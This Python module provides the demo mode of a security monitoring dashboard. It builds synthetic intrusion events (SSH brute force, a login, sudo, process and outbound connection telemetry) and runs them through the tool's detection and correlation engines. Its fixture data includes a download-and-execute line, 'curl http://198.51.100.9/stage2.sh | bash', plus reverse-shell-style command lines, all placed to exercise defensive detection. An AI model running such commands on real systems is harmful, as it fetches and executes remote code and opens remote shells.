"""Demo mode: synthetic data for the dashboard (Phase 6).

``sentinelforge dashboard --demo`` fills a **separate** database with one
synthetic intrusion and replays a little activity onto the event bus, so the
interface can be evaluated on a machine with no eBPF, no interesting logs and
no API key.

Two rules govern this module:

1. **Nothing here is real.** It generates :class:`SecurityEvent` objects in
   memory and runs them through the same detection and correlation engines the
   real pipeline uses. It sends no traffic, touches no other host, and creates
   no processes. It is a fixture, not a simulator of attacks against anything.
2. **It never mixes with real telemetry.** Demo data lives in its own database
   file (:func:`default_demo_database_path`), the process is flagged as a demo,
   and every page carries a "DEMO / SYNTHETIC DATA" banner.

The scenario is the canonical SentinelForge one, so the dashboard demonstrates
the whole pipeline: SSH brute force -> successful authentication -> suspicious
sudo -> process execution -> outbound network connection -> one correlated
incident -> an AI analysis from the offline mock provider.
"""

from __future__ import annotations

import logging
import os
from datetime import datetime, timedelta, timezone

from ..ai.analyst import AISocAnalyst, AnalystConfig, attach_analysis
from ..ai.cache import MemoryAnalysisCache
from ..ai.client import LLMClient, LLMConfig
from ..ai.providers.mock import MockProvider
from ..bus import EventBus, Topic, default_bus
from ..correlation.engine import CorrelationEngine
from ..detection.engine import DetectionEngine
from ..models.event import EventType, SecurityEvent, Severity, format_timestamp
from ..storage.sqlite import IncidentStore
from .monitor import Monitor
from .serializers import serialize_alert, serialize_event

LOGGER = logging.getLogger(__name__)

#: Marker put on every demo record that reaches the bus.
DEMO_LABEL = "DEMO / SYNTHETIC DATA"

DEMO_HOST = "fedora-demo"
DEMO_USER = "capslock"
DEMO_SOURCE_IP = "192.168.1.50"
DEMO_C2_IP = "198.51.100.9"


def default_demo_database_path() -> str:
    """Demo database location -- deliberately not the real incident store."""
    base = os.environ.get("XDG_CACHE_HOME") or os.path.join(
        os.path.expanduser("~"), ".cache"
    )
    return os.path.join(base, "sentinelforge", "demo-incidents.db")


def _event(offset: float, base: datetime, **fields) -> SecurityEvent:
    defaults = {
        "timestamp": format_timestamp(base + timedelta(seconds=offset)),
        "host": DEMO_HOST,
        "source": "systemd-journal",
        "severity": Severity.INFO,
        "event_type": EventType.UNKNOWN,
    }
    defaults.update(fields)
    return SecurityEvent(**defaults)


def demo_events(base: datetime | None = None) -> list[SecurityEvent]:
    """The synthetic intrusion, as normalized events.

    Written the way Phase 1 would normalize real log lines, and the way the
    Phase 4 sensors would emit telemetry, so the detection rules see exactly
    the shapes they were written for.
    """
    base = base or (datetime.now(timezone.utc) - timedelta(minutes=12))
    events: list[SecurityEvent] = []

    # 1. Brute force: five failed passwords from one address.
    for index in range(5):
        events.append(
            _event(
                index * 20,
                base,
                event_type=EventType.AUTHENTICATION_FAILURE,
                severity=Severity.MEDIUM,
                process="sshd",
                user=DEMO_USER,
                src_ip=DEMO_SOURCE_IP,
                message=f"Failed password for {DEMO_USER} from {DEMO_SOURCE_IP} port 22 ssh2",
            )
        )

    # 2. ... then a success from the same address.
    events.append(
        _event(
            140,
            base,
            event_type=EventType.AUTHENTICATION_SUCCESS,
            severity=Severity.LOW,
            process="sshd",
            user=DEMO_USER,
            src_ip=DEMO_SOURCE_IP,
            message=f"Accepted password for {DEMO_USER} from {DEMO_SOURCE_IP} port 22 ssh2",
        )
    )

    # 3. Privilege escalation: sudo running a download-and-execute one-liner.
    events.append(
        _event(
            200,
            base,
            event_type=EventType.SUDO,
            severity=Severity.MEDIUM,
            process="sudo",
            user=DEMO_USER,
            message=(
                f"{DEMO_USER} : TTY=pts/0 ; PWD=/home/{DEMO_USER} ; USER=root ; "
                f"COMMAND=/usr/bin/curl http://{DEMO_C2_IP}/stage2.sh | bash"
            ),
        )
    )

    # 4. Process telemetry: curl spawning a shell (eBPF process sensor shape).
    events.append(
        _event(
            215,
            base,
            source="ebpf-process",
            event_type=EventType.PROCESS_START,
            process="bash",
            user=DEMO_USER,
            message="process bash started by curl",
            metadata={
                "pid": 4242,
                "ppid": 4231,
                "uid": 1000,
                "parent_process": "curl",
                "executable": "/usr/bin/bash",
                "command_line": "bash -i",
            },
        )
    )
    events.append(
        _event(
            216,
            base,
            source="ebpf-process",
            event_type=EventType.PROCESS_START,
            process="python3",
            user=DEMO_USER,
            message="process python3 started by bash",
            metadata={
                "pid": 4250,
                "ppid": 4242,
                "uid": 1000,
                "parent_process": "bash",
                "executable": "/usr/bin/python3",
                "command_line": "python3 -c import socket,subprocess",
            },
        )
    )

    # 5. Network telemetry: the shell calling out (eBPF network sensor shape).
    events.append(
        _event(
            230,
            base,
            source="ebpf-network",
            event_type=EventType.NETWORK_CONNECTION,
            process="bash",
            user=DEMO_USER,
            src_ip="10.0.2.15",
            message=f"bash connected to {DEMO_C2_IP}:443 (tcp)",
            metadata={
                "pid": 4242,
                "uid": 1000,
                "source_ip": "10.0.2.15",
                "source_port": 54210,
                "destination_ip": DEMO_C2_IP,
                "destination_port": 443,
                "protocol": "tcp",
                "direction": "outbound",
                "process_name": "bash",
            },
        )
    )
    return events


def build_demo_data(db_path: str, analyze: bool = True, reset: bool = True) -> list:
    """Run the synthetic events through the real pipeline and store the result.

    Uses :class:`DetectionEngine` and :class:`CorrelationEngine` unchanged --
    demo mode does not have its own detection logic, which is the point: what
    the dashboard shows is what the engines actually produce.

    Args:
        db_path: Demo database (separate from the real incident store).
        analyze: Also attach an AI analysis from the **offline mock** provider.
        reset: Delete any previous demo database first, so repeated runs do not
            accumulate duplicates.
    """
    if reset and db_path != ":memory:" and os.path.exists(db_path):
        try:
            os.remove(db_path)
        except OSError as exc:  # pragma: no cover - permissions
            LOGGER.warning("could not reset the demo database %s: %s", db_path, exc)

    events = demo_events()
    alerts = DetectionEngine().run(events)
    incidents = CorrelationEngine().run(alerts)

    if analyze:
        analyst = AISocAnalyst(
            LLMClient(MockProvider(), LLMConfig(), sleep=lambda _: None),
            AnalystConfig(),
            cache=MemoryAnalysisCache(),
        )
        for incident in incidents:
            analysis = analyst.analyze(incident)
            if analysis.ok:
                attach_analysis(incident, analysis)

    with IncidentStore(db_path) as store:
        store.save_all(incidents)

    LOGGER.info(
        "demo data: %d event(s) -> %d alert(s) -> %d incident(s) in %s",
        len(events),
        len(alerts),
        len(incidents),
        db_path,
    )
    return incidents


class DemoFeeder(Monitor):
    """Replays synthetic activity onto the bus so the live view moves.

    Publishes one event (and the occasional alert) per tick, cycling through
    the demo scenario.  Every payload is tagged ``demo: true`` and carries the
    :data:`DEMO_LABEL`, so nothing in the interface can present it as real
    telemetry.
    """

    def __init__(self, bus: EventBus | None = None, interval: float = 3.0) -> None:
        super().__init__(interval, bus or default_bus(), name="demo-feeder")
        self._events = demo_events()
        self._alerts = DetectionEngine().run(self._events)
        self._index = 0
        self.published = 0

    def tick(self) -> None:
        if not self._events:  # pragma: no cover - demo_events is never empty
            return
        event = self._events[self._index % len(self._events)]
        payload = serialize_event(event)
        payload.update({"demo": True, "demo_label": DEMO_LABEL})
        self.bus.publish(Topic.EVENT_RECEIVED, payload)
        self.published += 1

        # Every few events, replay the alert the detector raised for them.
        if self._alerts and self._index % 3 == 2:
            alert = self._alerts[(self._index // 3) % len(self._alerts)]
            alert_payload = serialize_alert(alert)
            alert_payload.update({"demo": True, "demo_label": DEMO_LABEL})
            self.bus.publish(Topic.ALERT_CREATED, alert_payload)
            self.published += 1
        self._index += 1
